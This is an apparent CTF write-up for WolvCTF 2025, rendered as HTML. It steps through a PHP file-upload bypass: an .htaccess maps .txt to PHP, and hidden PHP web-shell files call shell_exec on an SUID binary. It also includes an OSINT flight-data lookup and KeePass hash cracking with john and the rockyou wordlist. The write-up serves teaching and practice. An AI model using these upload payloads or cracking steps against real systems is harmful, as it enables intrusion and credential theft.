+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="c"># Create the uploads directory and make it unreadable but writeable</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> mkdir -p /var/www/html/uploads <span class="o">&amp;&amp;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    chown root:www-data /var/www/html/uploads <span class="o">&amp;&amp;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    chmod <span class="m">730</span> /var/www/html/uploads<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="c"># Make /var/www/html/ only readable</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> chown root:www-data /var/www/html/ <span class="o">&amp;&amp;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    chmod <span class="m">750</span> /var/www/html/<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="c"># Copy flag.txt over</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">COPY</span> flag.txt /var/www/html/flag.txt<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> chown root:root /var/www/html/flag.txt <span class="o">&amp;&amp;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    chmod <span class="m">400</span> /var/www/html/flag.txt<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="c"># Copy get_flag over and compile</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">COPY</span> get_flag.c /var/www/html/get_flag.c<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> gcc /var/www/html/get_flag.c -o /var/www/html/get_flag <span class="o">&amp;&amp;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    chown root:www-data /var/www/html/get_flag <span class="o">&amp;&amp;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    chmod <span class="m">4755</span> /var/www/html/get_flag <span class="o">&amp;&amp;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    rm /var/www/html/get_flag.c<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="c"># Create a cron job to delete uploads every hour, we can review them fast enough</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> <span class="nb">echo</span> <span class="s2">&#34;0 * * * * root find /var/www/html/uploads -type f -delete&#34;</span> &gt; /etc/cron.d/delete-uploads<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> chmod <span class="m">0644</span> /etc/cron.d/delete-uploads<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> crontab /etc/cron.d/delete-uploads<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="c"># Start apache and cron</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">CMD</span> bash -c <span class="s2">&#34;cron &amp;&amp; apache2-foreground&#34;</span><span class="err">
+</span></span></span></code></pre></div><h4 id="step-1" class="relative group">Step 1 <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-1" aria-label="Anchor">#</a></span></h4><p>In <code>index.php</code> there is the following:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// Get the extention by getting everyting past the last &#39;.&#39;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">last</span> <span class="p">(</span><span class="nv">$lastDotPosition</span> <span class="o">==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$filename</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$target_file</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$lastDotPosition</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$extension</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$filename</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$target_file</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$lastDotPosition</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$extension</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$target_file</span><span class="p">,</span> <span class="nv">$lastDotPosition</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Since there is a loose comparison (== instead of ===), this means if the last dot position is 0, this will evaluate to try and the extension will be empty. therefore, hidden files do not count as an extension</p>
+<h4 id="step-2" class="relative group">Step 2 <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-2" aria-label="Anchor">#</a></span></h4><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// Ensure that the extention is a txt file
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span> <span class="nv">$extension</span> <span class="o">!==</span> <span class="s1">&#39;&#39;</span> <span class="o">&amp;&amp;</span> <span class="nv">$extension</span> <span class="o">!==</span> <span class="s1">&#39;txt&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">echo</span> <span class="s2">&#34;Sorry, only .txt extensions are allowed&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">$uploadOk</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>As long as our file does not contain an extension, it can be uploaded. this includes <code>.htaccess</code> files. an <code>.htaccess</code> file can be uploaded that contains the following to allow <code>.txt</code> files to execute as php:</p>
+<pre tabindex="0"><code>AddType application/x-httpd-php .txt
+</code></pre><h4 id="step-3" class="relative group">Step 3 <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-3" aria-label="Anchor">#</a></span></h4><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$old_path</span> <span class="o">=</span> <span class="nx">getcwd</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nx">chdir</span><span class="p">(</span><span class="nv">$target_dir</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// make unreadable - the proper way
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">shell_exec</span><span class="p">(</span><span class="s1">&#39;chmod -- 000 *&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">chdir</span><span class="p">(</span><span class="nv">$old_path</span><span class="p">);</span>
+</span></span></code></pre></div><p>Due to the &ndash; in the chmod command, an attacker can not upload file such as <code>--reference=file.txt</code>. However, since they changed the <code>.htaccess</code> file to execute commands as php, they can upload a hidden file that will not get hit by the <code>chmod --- 000 *</code> command. This may be hard to notice, since the <code>.htaccess</code> is forbidden by default. <code>.call_get_flag.txt</code> can be uploaded containing the following:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span><span class="p">(</span><span class="nx">shell_exec</span><span class="p">(</span><span class="s1">&#39;/var/www/html/get_flag 2&gt;&amp;1&#39;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><h4 id="step-4" class="relative group">Step 4 <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-4" aria-label="Anchor">#</a></span></h4><p>An attacker needs to go into their cookies on the browser and grab PHPSESSID. Then they can navigate to the following URL (example PHPSESSID:fb14797cfe048e2eab6f43d87ba82592)</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="/posts/wolvctf-2025/Pasted_image_20250324173220_hu1209673873984896265.webp 330w,/posts/wolvctf-2025/Pasted_image_20250324173220_hu16401126413375633199.webp 660w
+            
+              ,/posts/wolvctf-2025/Pasted_image_20250324173220_hu10525272346150449667.webp 1024w
+            
+            
+              ,/posts/wolvctf-2025/Pasted_image_20250324173220_hu3360096476535968456.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="1658"
+        height="536"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="/posts/wolvctf-2025/Pasted_image_20250324173220_hu10190992705482235710.png"
+          srcset="/posts/wolvctf-2025/Pasted_image_20250324173220_hu9616412093236145441.png 330w,/posts/wolvctf-2025/Pasted_image_20250324173220_hu10190992705482235710.png 660w
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250324173220_hu18296284674224090508.png 1024w
+          
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250324173220_hu4238588253057771921.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>after uploading the .htaccess file and .backdoor.txt, an attacker can navigate to the following:</p>
+<p><a href="https://art-contest-974780027560.us-east5.run.app/uploads/fb14797cfe048e2eab6f43d87ba82592/.call_get_flag.txt" target="_blank" rel="noreferrer">https://art-contest-974780027560.us-east5.run.app/uploads/fb14797cfe048e2eab6f43d87ba82592/.call_get_flag.txt</a></p>
+<p>They will get this error:</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="/posts/wolvctf-2025/Pasted_image_20250324173941_hu3017086136321217158.webp 330w,/posts/wolvctf-2025/Pasted_image_20250324173941_hu1612459968745924186.webp 660w
+            
+              ,/posts/wolvctf-2025/Pasted_image_20250324173941_hu8812155516064599910.webp 1024w
+            
+            
+              ,/posts/wolvctf-2025/Pasted_image_20250324173941_hu9148889630887377162.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="2688"
+        height="540"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="/posts/wolvctf-2025/Pasted_image_20250324173941_hu15635408600658576506.png"
+          srcset="/posts/wolvctf-2025/Pasted_image_20250324173941_hu10376727351906921042.png 330w,/posts/wolvctf-2025/Pasted_image_20250324173941_hu15635408600658576506.png 660w
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250324173941_hu1586685442473471092.png 1024w
+          
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250324173941_hu12365692297020050429.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<pre tabindex="0"><code>Error opening file: No such file or directory 
+</code></pre><h4 id="step-5" class="relative group">Step 5 <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-5" aria-label="Anchor">#</a></span></h4><p>After reading the source file of get_flag.c, or downloading the file by navigating to
+<a href="https://art-contest-974780027560.us-east5.run.app/get_flag" target="_blank" rel="noreferrer">https://art-contest-974780027560.us-east5.run.app/get_flag</a> and testing it, the attacker realizes they need to execute the SUID binary in the diretory <code>/var/www/html</code> since it is reading <code>./flag.txt</code>, not <code>/var/www/html/flag.txt</code>. they can create another file and upload it named <code>.call_get_flag_in_dir.txt</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">chdir</span><span class="p">(</span><span class="s1">&#39;/var/www/html&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span><span class="p">(</span><span class="nx">shell_exec</span><span class="p">(</span><span class="s1">&#39;./get_flag&#39;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p><a href="https://art-contest-974780027560.us-east5.run.app/uploads/fb14797cfe048e2eab6f43d87ba82592/.call_get_flag_in_dir.txt" target="_blank" rel="noreferrer">https://art-contest-974780027560.us-east5.run.app/uploads/fb14797cfe048e2eab6f43d87ba82592/.call_get_flag_in_dir.txt</a></p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="dreeSec.github.io/content/posts/WolvCTF-2025/Pasted_image_20250324173903.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<pre tabindex="0"><code>wctf{m1ss3d_m3_chm0d_:3}
+</code></pre><hr>
+<h2 id="lost-2" class="relative group">Lost 2 <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#lost-2" aria-label="Anchor">#</a></span></h2><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="/posts/wolvctf-2025/Pasted_image_20250324174907_hu7876552114256522574.webp 330w,/posts/wolvctf-2025/Pasted_image_20250324174907_hu16528386425757849990.webp 660w
+            
+              
+                ,/posts/wolvctf-2025/Pasted_image_20250324174907_hu9072050260477786045.webp 980w
+              
+            
+            
+              
+                ,/posts/wolvctf-2025/Pasted_image_20250324174907_hu9072050260477786045.webp 980w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="980"
+        height="1132"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="/posts/wolvctf-2025/Pasted_image_20250324174907_hu16853167183703093376.png"
+          srcset="/posts/wolvctf-2025/Pasted_image_20250324174907_hu5972616285761923956.png 330w,/posts/wolvctf-2025/Pasted_image_20250324174907_hu16853167183703093376.png 660w
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250324174907.png 980w
+          
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250324174907.png 980w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h3 id="challenge-description-1" class="relative group">Challenge Description <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#challenge-description-1" aria-label="Anchor">#</a></span></h3><p>My other friend Johnny is somehow&hellip;worse. All I know is he is in the US, nothing else. He messaged me in January of this year saying &ldquo;My flight took off just over a day and 2 hours late due to weather this SUCKS I could have driven there and back soooo many times by now&rdquo; and &ldquo;Sorry meant to send that last month lol airplane mode :PPP&rdquo;</p>
+<p>There&rsquo;s no shot of finding him right? If you do pls send the flight number using the IATA code not ICAO thanks (Flag format: wctf{XX####})</p>
+<h3 id="solve-1" class="relative group">Solve <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#solve-1" aria-label="Anchor">#</a></span></h3><p>Check the government website for databases to get the full set of data (since you can&rsquo;t just input one airport): <a href="https://www.transtats.bts.gov/DataIndex.asp" target="_blank" rel="noreferrer">https://www.transtats.bts.gov/DataIndex.asp</a></p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="/posts/wolvctf-2025/1_hu7166457620377279922.webp 330w,/posts/wolvctf-2025/1_hu9717098045931019777.webp 660w
+            
+              ,/posts/wolvctf-2025/1_hu1935761773060414038.webp 1024w
+            
+            
+              ,/posts/wolvctf-2025/1_hu15443632547999237593.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="3315"
+        height="2070"
+        class="mx-auto my-0 rounded-md"
+        alt="databases"
+        loading="lazy" decoding="async"
+        
+          src="/posts/wolvctf-2025/1_hu3948971553457889381.png"
+          srcset="/posts/wolvctf-2025/1_hu981707382427761100.png 330w,/posts/wolvctf-2025/1_hu3948971553457889381.png 660w
+          
+            ,/posts/wolvctf-2025/1_hu3384236152085351343.png 1024w
+          
+          
+            ,/posts/wolvctf-2025/1_hu7014225029576353811.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="/posts/wolvctf-2025/2_hu5819364551176521198.webp 330w,/posts/wolvctf-2025/2_hu12670179032863784084.webp 660w
+            
+              ,/posts/wolvctf-2025/2_hu10280179414513037622.webp 1024w
+            
+            
+              ,/posts/wolvctf-2025/2_hu1597116012794832866.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="3355"
+        height="2090"
+        class="mx-auto my-0 rounded-md"
+        alt="tables"
+        loading="lazy" decoding="async"
+        
+          src="/posts/wolvctf-2025/2_hu4570681035230944364.png"
+          srcset="/posts/wolvctf-2025/2_hu16538559435187034283.png 330w,/posts/wolvctf-2025/2_hu4570681035230944364.png 660w
+          
+            ,/posts/wolvctf-2025/2_hu10232481076393976588.png 1024w
+          
+          
+            ,/posts/wolvctf-2025/2_hu14351791456643851554.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>Eventually make your way to the <code>Marketing Carrier On-Time Performance</code> and filter by December 2024: <a href="https://www.transtats.bts.gov/DL_SelectFields.aspx?gnoyr_VQ=FGK&amp;QO_fu146_anzr=b0-gvzr" target="_blank" rel="noreferrer">https://www.transtats.bts.gov/DL_SelectFields.aspx?gnoyr_VQ=FGK&QO_fu146_anzr=b0-gvzr</a></p>
+<p>This will show specific details about US based flights, such as departure delays</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="/posts/wolvctf-2025/3_hu6166914208801582607.webp 330w,/posts/wolvctf-2025/3_hu6664617674343172241.webp 660w
+            
+              ,/posts/wolvctf-2025/3_hu1265294936333615373.webp 1024w
+            
+            
+              ,/posts/wolvctf-2025/3_hu9916987419349388228.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="3205"
+        height="2082"
+        class="mx-auto my-0 rounded-md"
+        alt="transportation stats"
+        loading="lazy" decoding="async"
+        
+          src="/posts/wolvctf-2025/3_hu7695617458872730362.png"
+          srcset="/posts/wolvctf-2025/3_hu260825033250730146.png 330w,/posts/wolvctf-2025/3_hu7695617458872730362.png 660w
+          
+            ,/posts/wolvctf-2025/3_hu6371956464956297248.png 1024w
+          
+          
+            ,/posts/wolvctf-2025/3_hu16050999343974438224.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>Need to select the following:</p>
+<pre tabindex="0"><code>IATA_Code_Marketing_Airline	
+Flight_Number_Marketing_Airline
+
+OriginCityName
+DestCityName
+
+DepDelay 
+WeatherDelay
+</code></pre><p>The first two are to get the flight number for the flag, the city names are so we can confirm they are close to each other (from the message saying he could have driven back and forth several times), the departure delay to confirm it&rsquo;s around 26 hours late, and weather delay to confirm the delay is due to weather.</p>
+<p>Open in excel or other editor and sort <code>WeatherDelay</code>:
+
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="/posts/wolvctf-2025/4_hu12468475150226037408.webp 330w,/posts/wolvctf-2025/4_hu526982005486729968.webp 660w
+            
+              ,/posts/wolvctf-2025/4_hu8459462698616094328.webp 1024w
+            
+            
+              ,/posts/wolvctf-2025/4_hu8018548955756119230.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="3812"
+        height="1697"
+        class="mx-auto my-0 rounded-md"
+        alt="excel"
+        loading="lazy" decoding="async"
+        
+          src="/posts/wolvctf-2025/4_hu13450802845974994435.png"
+          srcset="/posts/wolvctf-2025/4_hu1472186559683671776.png 330w,/posts/wolvctf-2025/4_hu13450802845974994435.png 660w
+          
+            ,/posts/wolvctf-2025/4_hu8977579349516614762.png 1024w
+          
+          
+            ,/posts/wolvctf-2025/4_hu11179609897170790036.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>Confirmation using flight radar that on December 24, the flight was delayed ~26 hours:</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="/posts/wolvctf-2025/5_hu12583080651560742740.webp 330w,/posts/wolvctf-2025/5_hu8383762061805501937.webp 660w
+            
+              ,/posts/wolvctf-2025/5_hu7450080175948381122.webp 1024w
+            
+            
+              ,/posts/wolvctf-2025/5_hu4149948983850790909.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="3382"
+        height="2112"
+        class="mx-auto my-0 rounded-md"
+        alt="confirmation"
+        loading="lazy" decoding="async"
+        
+          src="/posts/wolvctf-2025/5_hu12810819837654908693.png"
+          srcset="/posts/wolvctf-2025/5_hu17503641420395854136.png 330w,/posts/wolvctf-2025/5_hu12810819837654908693.png 660w
+          
+            ,/posts/wolvctf-2025/5_hu7673534834426516104.png 1024w
+          
+          
+            ,/posts/wolvctf-2025/5_hu12011652115655236962.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h2 id="passwords" class="relative group">Passwords <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#passwords" aria-label="Anchor">#</a></span></h2><p>![[Pasted_image_20250324180345.png]]</p>
+<h3 id="challenge-description-2" class="relative group">Challenge Description <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#challenge-description-2" aria-label="Anchor">#</a></span></h3><h3 id="solve-2" class="relative group">Solve <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#solve-2" aria-label="Anchor">#</a></span></h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">┌──(kali㉿kali)-[~/ctf/Passwords]
+</span></span></span><span class="line"><span class="cl"><span class="go">└─$ keepass2john Database.kdbx &gt; keepass.hash
+</span></span></span><span class="line"><span class="cl"><span class="go">                                                                  
+</span></span></span><span class="line"><span class="cl"><span class="go">┌──(kali㉿kali)-[~/ctf/Passwords]
+</span></span></span><span class="line"><span class="cl"><span class="go">└─$ keepass2john Database.kdbx               
+</span></span></span><span class="line"><span class="cl"><span class="go">Database:$keepass$*2*6000*0*5bd85bff1c654df5d8cb8f64b877ea179b66978615917c39faf6edd98444928b*dec1f1a8a46d2257b1c536800ccea618d15523c983162f1a760d0f0e3f32bed6*02dc62f9e295c9a256e4e231b3102c1a*8ed6478291ac58151a98e7465f10a11e8cafc1706d048ef4f94fe51453f091bc*193dd9a5673c4a3f5b33dd59639f27760f03285044f14eacc652f4a441b45413
+</span></span></span><span class="line"><span class="cl"><span class="go">                                                                  
+</span></span></span><span class="line"><span class="cl"><span class="go">┌──(kali㉿kali)-[~/ctf/Passwords]
+</span></span></span><span class="line"><span class="cl"><span class="go">└─$ keepass2john Database.kdbx &gt; keepass.hash                    
+</span></span></span><span class="line"><span class="cl"><span class="go">                                                                  
+</span></span></span><span class="line"><span class="cl"><span class="go">┌──(kali㉿kali)-[~/ctf/Passwords]
+</span></span></span><span class="line"><span class="cl"><span class="go">└─$ john --wordlist=/usr/share/wordlists/rockyou.txt keepass.hash
+</span></span></span><span class="line"><span class="cl"><span class="go">Using default input encoding: UTF-8
+</span></span></span><span class="line"><span class="cl"><span class="go">Loaded 1 password hash (KeePass [SHA256 AES 32/64])
+</span></span></span><span class="line"><span class="cl"><span class="go">Cost 1 (iteration count) is 6000 for all loaded hashes
+</span></span></span><span class="line"><span class="cl"><span class="go">Cost 2 (version) is 2 for all loaded hashes
+</span></span></span><span class="line"><span class="cl"><span class="go">Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
+</span></span></span><span class="line"><span class="cl"><span class="go">Will run 4 OpenMP threads
+</span></span></span><span class="line"><span class="cl"><span class="go">Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+</span></span></span><span class="line"><span class="cl"><span class="go">0g 0:00:00:47 0.35% (ETA: 02:50:40) 0g/s 1297p/s 1297c/s 1297C/s 159753159753..141106
+</span></span></span><span class="line"><span class="cl"><span class="go">goblue1          (Database)     
+</span></span></span><span class="line"><span class="cl"><span class="go">1g 0:00:01:10 DONE (2025-03-09 23:09) 0.01424g/s 1269p/s 1269c/s 1269C/s gobucks1..giana
+</span></span></span><span class="line"><span class="cl"><span class="go">Use the &#34;--show&#34; option to display all of the cracked passwords reliably
+</span></span></span><span class="line"><span class="cl"><span class="go">Session completed. 
+</span></span></span></code></pre></div><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="/posts/wolvctf-2025/Pasted_image_20250324180843_hu351519795778028908.webp 330w,/posts/wolvctf-2025/Pasted_image_20250324180843_hu8674492713245719603.webp 660w
+            
+              
+                ,/posts/wolvctf-2025/Pasted_image_20250324180843_hu14188921707202275143.webp 864w
+              
+            
+            
+              
+                ,/posts/wolvctf-2025/Pasted_image_20250324180843_hu14188921707202275143.webp 864w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="864"
+        height="772"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="/posts/wolvctf-2025/Pasted_image_20250324180843_hu14542903196780981810.png"
+          srcset="/posts/wolvctf-2025/Pasted_image_20250324180843_hu10719543910862738314.png 330w,/posts/wolvctf-2025/Pasted_image_20250324180843_hu14542903196780981810.png 660w
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250324180843.png 864w
+          
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250324180843.png 864w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>Flag:</p>
+<pre tabindex="0"><code>wctf{1_th0ught_1t_w4s_s3cur3?}
+</code></pre><h2 id="active-1-domain-access" class="relative group">Active 1: Domain Access <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#active-1-domain-access" aria-label="Anchor">#</a></span></h2><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="/posts/wolvctf-2025/Pasted_image_20250324175946_hu10248864819772471983.webp 330w,/posts/wolvctf-2025/Pasted_image_20250324175946_hu121622904127869675.webp 660w
+            
+              
+                ,/posts/wolvctf-2025/Pasted_image_20250324175946_hu8859583683478370686.webp 898w
+              
+            
+            
+              
+                ,/posts/wolvctf-2025/Pasted_image_20250324175946_hu8859583683478370686.webp 898w
+              
